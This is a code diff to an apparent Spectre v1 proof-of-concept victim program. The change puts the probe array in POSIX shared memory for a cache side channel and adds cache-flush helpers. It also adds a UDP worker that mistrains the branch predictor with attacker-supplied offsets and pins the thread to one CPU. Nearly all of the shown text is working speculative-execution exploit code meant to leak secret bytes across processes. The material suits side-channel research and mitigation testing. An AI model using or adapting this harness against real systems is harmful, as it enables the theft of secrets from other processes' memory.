@@ -23,16 +23,23 @@
 #include <cstdlib>
 #include <cstdint>
 #include <cstring>
-#ifdef _MSC_VER
-#include <intrin.h> /* for rdtsc, rdtscp, clflush */
-#pragma optimize("gt",on)
-#else
 #include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
-#endif
+
+// POSIX C Includes:
+#include <sys/mman.h>  /* for POSIX Shared Memory */
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
 
 // Local Includes:
 #include "udp-socket.h"
 #include "defines.h"
+
+/********************************************************************
+Victim constants.
+********************************************************************/
+//constexpr size_t MAX_LEN = 256 * 512;
 
 
 /********************************************************************
@@ -42,11 +49,17 @@ unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
 uint8_t unused2[64];
-uint8_t array2[256 * 512];
+//uint8_t array2[256 * 512];
 
 char secret[4096];       // contiguous, nearby secret in static-globals section
 std::string secret_heap; // contiguous, secret's data exists on heap
-//const char *secret = "Replace me with a run-time secret...";
+
+
+/********************************************************************
+Victim shared-memory.
+********************************************************************/
+region* sm_ptr;
+uint8_t* array2;
 
 
 /********************************************************************
@@ -87,11 +100,38 @@ void update_secret(const std::string& s) {
   std::cout << "- byte offset relative to array1: " << malicious_x << '\n';
 }
 
+
 void init_pages() {
-  for (auto i = 0; i < sizeof(array2); i++) {
-    array2[i] = 1; /* write to array2 to initialize pages */
+  constexpr auto SM_HANDLENAME = "spectre-victim_shm";
+  constexpr auto SM_SIZE = sizeof(region);
+  constexpr size_t PAGE_SIZE = 1<<12;  // 4 KB Pages
+
+  // Setup shared memory for array2 (side-channel):
+  int sm_handle = shm_open(SM_HANDLENAME, O_CREAT|O_TRUNC|O_RDWR, S_IRUSR|S_IWUSR);
+  if (sm_handle < 0) {
+    std::cerr << "Error opening shared memory with handle name: "
+              << SM_HANDLENAME << std::endl;
+    exit(EXIT_FAILURE);
+  }
+  if (ftruncate(sm_handle, SM_SIZE) < 0) {
+    std::cerr << "Error on allocating shared memory of size: "
+              << SM_SIZE << std::endl;
+    exit(EXIT_FAILURE);
+  }
+  sm_ptr = static_cast<region*>(
+        mmap(NULL, SM_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, sm_handle, 0) );
+  if (sm_ptr == MAP_FAILED) {
+    std::cerr << "Error mapping shared memory" << std::endl;
+    exit(EXIT_FAILURE);
+  }
+
+  // Write to array2 to initialize pages:
+  array2 = sm_ptr->array2;
+  for (auto i = 0; i < sizeof(region::array2); i += PAGE_SIZE) {
+    array2[i] = 1;
   }
 }
+
 
 void print_config() {
   /* Print git commit hash */
@@ -127,9 +167,7 @@ void print_config() {
 /********************************************************************
 UDP socket functions.
 ********************************************************************/
-void helper(size_t malicious_x) {
-  size_t training_x, x;
-
+inline void flush_array2() {
 #ifndef NOCLFLUSH
     /* Flush array2[256*(0..255)] from cache */
     for (int i = 0; i < 256; i++)
@@ -141,11 +179,10 @@ void helper(size_t malicious_x) {
       for (int i = 0; i < 256; i++)
         flush_memory_sse( &array2[i*512] );
 #endif
+}
 
-///    training_x = tries % array1_size;
-    training_x = 0;
-    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-    for (int j = 29; j >= 0; j--) {
+
+inline void flush_condition() {
 #ifndef NOCLFLUSH
       _mm_clflush( &array1_size );
 #else
@@ -163,22 +200,32 @@ void helper(size_t malicious_x) {
 #else
       for (volatile int z = 0; z < 100; z++) {}
 #endif
+}
 
-      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
-      /* Avoid jumps in case those tip off the branch predictor */
-      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
-      x = training_x ^ (x & (malicious_x ^ training_x));
 
-      /* Call the victim function! */
-      victim_function(x);
-    }
+void helper(size_t malicious_x, size_t training_x = 0) {
+  flush_array2();
 
-    // have attacker measure cache state...
+  /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
+  for (int j = 29; j >= 0; j--) {
+    flush_condition();
+
+    /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
+    /* Avoid jumps in case those tip off the branch predictor */
+    size_t x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
+    x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
+    x = training_x ^ (x & (malicious_x ^ training_x));
+
+    /* Call the victim function! */
+    victim_function(x);
+  }
+  /// attacker may now measure cache state...
 }
 
 
 void recv_worker(uint16_t port = 7777) {
+  constexpr size_t ARRAY1_LEN = 16;
+
   uint8_t buf[2048];
 
   SocketUDP s;
@@ -186,15 +233,21 @@ void recv_worker(uint16_t port = 7777) {
 
   std::cout << "["<<port<<"] - Receive worker thread listening." << std::endl;
 
+  size_t tries = 0;
   for (;;) {
     auto bytes = s.recv(buf, sizeof(buf));
     if (bytes == sizeof(msg)) {
       msg* m = (msg*)buf;
       auto x = m->x;
+      m->x = tries;
 
       std::cout << "["<<port<<"]- Received msg of " << bytes << " bytes.\n";
       std::cout << "x=" << x << std::endl;
-      victim_function(x);
+
+      size_t training_x = (tries++ * 13) % ARRAY1_LEN;
+      size_t malicious_x = x;
+      helper(malicious_x, training_x);
+      s.send(m, sizeof(*m));
     }
     else {
       std::cout << "["<<port<<"]- Received an unexpected" << bytes << "...\n";
@@ -212,8 +265,8 @@ Main.
 */
 int main(int argc, const char *argv[]) {
   // Initialization:
-  init_pages();
   print_config();
+  init_pages();   // Setup shared memory for array2 (side-channel)
 
   /* Parse the listen port from the first command line argument.
      (OPTIONAL) */
@@ -227,8 +280,19 @@ int main(int argc, const char *argv[]) {
 //    sscanf(argv[1], "%d", &cache_hit_threshold);
   }
 
+  // Create a cpu_set_t object representing a set of CPUs. Clear it and mark
+  // only CPU i as set.
+  cpu_set_t cpuset;
+  CPU_ZERO(&cpuset);
+  CPU_SET(1, &cpuset);
+
   // Setup receive thread to imitate server:
   std::thread t(recv_worker, port);
+  int rc = pthread_setaffinity_np(t.native_handle(), sizeof(cpuset), &cpuset);
+  if (rc != 0) {
+    std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
+  }
+
   std::this_thread::sleep_for(std::chrono::seconds(1));
 
   // Loop forever, allowing user to enter new secrets:
